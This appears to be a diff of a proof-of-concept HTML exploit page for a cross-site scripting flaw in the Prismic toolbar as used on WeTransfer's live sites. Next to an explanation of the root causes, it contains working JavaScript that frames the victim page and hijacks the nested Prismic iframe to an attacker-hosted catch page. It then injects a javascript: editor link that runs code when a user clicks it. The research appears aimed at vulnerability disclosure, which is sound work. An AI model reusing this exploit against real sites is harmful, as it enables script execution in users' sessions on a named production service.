@@ -5,7 +5,7 @@
 <style>
   body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
   h1 { color: #e94560; }
-  #log { background: #16213e; padding: 15px; border-radius: 8px; max-height: 500px; overflow-y: auto; }
+  #log { background: #16213e; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; margin: 10px 0; }
   .log-entry { margin: 4px 0; font-size: 13px; }
   .success { color: #0f0; }
   .error { color: #f00; }
@@ -25,56 +25,60 @@
 <h1>Prismic Toolbar XSS via Iframe Hijack</h1>
 
 <p>
-  <strong>Vulnerability:</strong> Prismic toolbar iframe (wetransfer.prismic.io) communication uses
+  <strong>Vulnerability:</strong> Prismic toolbar iframe communication uses
   <code>postMessage('setup_port', '*', [port])</code> — wildcard target origin.<br>
   <strong>Impact:</strong> Attacker navigates the Prismic iframe to a controlled page, intercepts the
   MessagePort, and injects malicious <code>editorUrl</code> into prediction documents.
   toolbar.js renders <code>&lt;a href={editorUrl}&gt;</code> with no protocol validation → XSS on click.
 </p>
 
-<label for="target">Target URL (frontsite-nextjs.wetransfer.net has Prismic toolbar):</label>
-<input id="target" type="text" value="https://frontsite-nextjs.wetransfer.net/blog">
+<label for="target">Target URL (wetransfer.com/blog has Prismic toolbar, no framing restrictions):</label>
+<input id="target" type="text" value="https://wetransfer.com/blog">
 
 <label for="catch">Catch page URL (host poc-prismic-catch.html):</label>
 <input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">
 
-<label for="delay">Iframe navigation delay (ms) — use 0 to win the race:</label>
-<input id="delay" type="number" value="0" style="width: 100px;">
+<label for="delay">Delay before navigating Prismic iframe (ms):</label>
+<input id="delay" type="number" value="3000" style="width: 100px;">
 
 <br>
 <button onclick="startAttack()">Launch</button>
 <div id="log"></div>
 
+<iframe name="victim" id="victim-frame" src="https://wetransfer.com/blog" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px;"></iframe>
+
 <h3>Attack Flow</h3>
 <pre>
-1. window.open(target) — open victim page in popup
-2. Poll victim.frames.length every 10ms until iframe appears
-3. IMMEDIATELY navigate frames[0] to attacker's catch page (delay=0)
-   — Must win race: navigate BEFORE prismic.io iframe finishes loading
+1. Target page (wetransfer.com/blog) is embedded in a named &lt;iframe name="victim"&gt;
+   — No X-Frame-Options or frame-ancestors headers → framing allowed
+   — Attacker is ANCESTOR → can navigate any descendant frame
+2. window.open(target, "victim") targets the existing iframe, returns its WindowProxy
+3. After delay, navigate the nested Prismic iframe:
+   x.frames[0].location.href = catchURL
    — prismic.js uses {once: true} load handler → fires for catch page instead
-   — prismic.io needs DNS+TLS+HTTP (~200-500ms), attacker navigates in &lt;20ms
-4. Catch page loads → iframe fires load event → prismic.js sends setup_port
-5. Catch page receives setup_port (wildcard '*' target origin), responds 'ready'
-6. Parent requests preview_state → catch returns auth:true (enables toolbar)
-7. Parent loads toolbar.js, creates Toolbar with prediction handler
-8. After 2s delay, parent requests prediction_docs → catch returns [{editorUrl: "javascript:..."}]
-9. toolbar.js renders: &lt;a href="javascript:..." class="document-summary"&gt; in Shadow DOM
-10. Prismic toolbar panel shows attacker's document with XSS link
-11. User clicks → JavaScript executes in wetransfer page context
+   — prismic.io needs DNS+TLS+HTTP (~200-500ms), attacker catches the race
+4. Catch page loads → receives setup_port from prismic.js (wildcard '*' origin)
+5. Catch page responds 'ready', then returns auth:true for preview_state
+6. Target page loads toolbar.js → Prismic Toolbar with prediction handler
+7. After 2s, prediction_docs request → catch returns [{editorUrl: "javascript:..."}]
+8. toolbar.js renders: &lt;a href="javascript:..." class="document-summary"&gt; in Shadow DOM
+9. Prismic toolbar icon appears at bottom-left of target page
+10. User clicks icon → panel opens → clicks document link → XSS fires
 </pre>
 
 <h3>Root Causes</h3>
 <pre>
 A. Wildcard postMessage target origin
    prismic.js: e.contentWindow.postMessage('setup_port', '*', [port2])
-   Any page loaded in the iframe receives the port.
+   Any page loaded in the iframe receives the MessagePort.
 
 B. No URL protocol validation on editorUrl
    toolbar.js:7461: e("a", { href: t.editorUrl, target: "_blank" })
-   Attacker controls editorUrl → javascript: protocol → XSS
+   Attacker controls editorUrl → javascript: protocol → XSS on click
 
-C. Cross-origin frame navigation allowed
-   Opener can navigate frames of opened window: x.frames[0].location.href = ...
+C. No framing restrictions on wetransfer.com
+   No X-Frame-Options or CSP frame-ancestors headers served
+   → can be embedded in attacker iframe → ancestor navigates descendant frames
 
 D. {once: true} load handler is exploitable
    prismic.js waits for iframe load event to send setup_port.
@@ -82,96 +86,82 @@ D. {once: true} load handler is exploitable
    the load event fires for attacker's content instead.
 </pre>
 
-<h3>Confirmed via Playwright MCP (2026-02-18)</h3>
-<pre>
-- Intercepted prismic iframe URL → served catch page content
-- toolbar.js loaded (auth:true triggered it)
-- Prismic Toolbar rendered with Shadow DOM
-- prediction_docs → &lt;a href="javascript:void(document.title='XSS_'+document.domain)"&gt;
-- Clicking link: document.title changed to "XSS_frontsite-nextjs.wetransfer.net"
-- XSS CONFIRMED in wetransfer page context
-</pre>
-
-<iframe src="https://frontsite-nextjs.wetransfer.net/blog" name="badr"></iframe>
-
 <script>
 function log(msg, cls) {
-  const div = document.getElementById('log');
-  const ts = new Date().toISOString().substr(11, 12);
+  var div = document.getElementById('log');
+  var ts = new Date().toISOString().substr(11, 12);
   div.innerHTML += '<div class="log-entry ' + (cls || 'info') + '">[' + ts + '] ' + msg + '</div>';
   div.scrollTop = div.scrollHeight;
 }
 
 function startAttack() {
-  const TARGET = document.getElementById('target').value;
-  const CATCH_URL = document.getElementById('catch').value;
-  const DELAY = parseInt(document.getElementById('delay').value) || 3000;
+  var TARGET = document.getElementById('target').value;
+  var CATCH_URL = document.getElementById('catch').value;
+  var DELAY = Number(document.getElementById('delay').value);
+  if (isNaN(DELAY) || DELAY < 0) DELAY = 3000;
 
   log('=== Prismic Toolbar XSS via Iframe Hijack ===', 'warn');
   log('Target: ' + TARGET, 'info');
   log('Catch page: ' + CATCH_URL, 'info');
   log('Delay: ' + DELAY + 'ms', 'info');
 
-  // Step 1: Open victim page
-  const victim = window.open(TARGET, "badr");
-  if (!victim) {
-    log('Popup blocked — allow popups and retry.', 'error');
+  // Step 1: window.open targets the existing named iframe, returns its WindowProxy
+  // The iframe is already loaded with the target page (pre-embedded in HTML)
+  var x = window.open(TARGET, "victim");
+  if (!x) {
+    log('Failed to get window reference.', 'error');
     return;
   }
-  log('Popup opened.', 'success');
+  log('Got reference to victim iframe window.', 'success');
 
-  // Step 2: Wait for frames to appear, then navigate IMMEDIATELY
-  // Race condition: must navigate before prismic.io iframe finishes loading
-  // prismic.js uses {once: true} load handler — if we navigate first,
-  // the load event fires for OUR catch page, and setup_port goes to us.
-  let navigated = false;
+  // Step 2: After delay, navigate the nested Prismic iframe to catch page
+  // x.frames[0] = the first child iframe inside wetransfer.com/blog (Prismic iframe)
+  // As ancestor, we can navigate descendant frames cross-origin
+  log('Waiting ' + DELAY + 'ms for Prismic iframe to appear...', 'info');
 
-  const poller = setInterval(function() {
-    if (navigated) { clearInterval(poller); return; }
-
-    try {
-      const frameCount = victim.frames.length;
-      if (frameCount > 0) {
-        navigated = true;
-        clearInterval(poller);
-        log('Detected ' + frameCount + ' frame(s) — navigating immediately!', 'success');
-
-        var doNavigate = function() {
-          try {
-            victim.frames[0].location.href = CATCH_URL;
-            log('Navigated frames[0] to catch page.', 'success');
-            log('Race condition: catch page must load before prismic.io iframe.', 'info');
-            log('', 'info');
-            log('Wait ~5 seconds for the full chain:', 'warn');
-            log('  1. Catch page loads → receives setup_port from prismic.js', 'info');
-            log('  2. Responds auth:true → toolbar.js loads (~2s)', 'info');
-            log('  3. prediction_docs → javascript: editorUrl injected', 'info');
-            log('  4. Prismic toolbar icon appears at bottom-left of victim page', 'info');
-            log('  5. Click icon → panel opens → click document link → XSS', 'info');
-          } catch(e) {
-            log('Failed to navigate iframe: ' + e.message, 'error');
-          }
-        };
-
-        if (DELAY > 0) {
-          log('Waiting ' + DELAY + 'ms before navigating...', 'info');
-          setTimeout(doNavigate, DELAY);
-        } else {
-          doNavigate();
-        }
-      }
-    } catch(e) {
-      // Cross-origin — can't read frames.length yet, keep polling
-    }
-  }, 10);  // Poll every 10ms for fastest detection
-
-  // Timeout
   setTimeout(function() {
-    if (!navigated) {
-      clearInterval(poller);
-      log('Timeout — no frames detected in victim window.', 'error');
+    try {
+      log('Attempting to navigate x.frames[0] to catch page...', 'info');
+      x.frames[0].location.href = CATCH_URL;
+      log('Navigated Prismic iframe to catch page!', 'success');
+      log('', 'info');
+      log('Wait ~5 seconds for the full chain:', 'warn');
+      log('  1. Catch page loads → receives setup_port from prismic.js', 'info');
+      log('  2. Responds auth:true → toolbar.js loads', 'info');
+      log('  3. prediction_docs → javascript: editorUrl injected', 'info');
+      log('  4. Prismic toolbar icon appears at bottom-left of page in iframe', 'info');
+      log('  5. Click icon → panel opens → click document link → XSS fires', 'info');
+    } catch(e) {
+      log('Failed: ' + e.message, 'error');
+      log('', 'info');
+      log('Trying alternative: polling for frames...', 'warn');
+
+      // Fallback: poll for child frames to appear
+      var attempts = 0;
+      var poller = setInterval(function() {
+        attempts++;
+        try {
+          var len = x.frames.length;
+          if (len > 0) {
+            clearInterval(poller);
+            log('Found ' + len + ' frame(s) after ' + (attempts * 100) + 'ms', 'success');
+            try {
+              x.frames[0].location.href = CATCH_URL;
+              log('Navigated frames[0] to catch page!', 'success');
+            } catch(e2) {
+              log('Navigation failed: ' + e2.message, 'error');
+            }
+          }
+        } catch(e3) {
+          // cross-origin access may throw, keep trying
+        }
+        if (attempts > 100) {
+          clearInterval(poller);
+          log('Gave up after 10s polling.', 'error');
+        }
+      }, 100);
     }
-  }, 15000);
+  }, DELAY);
 }
 </script>
 </body>
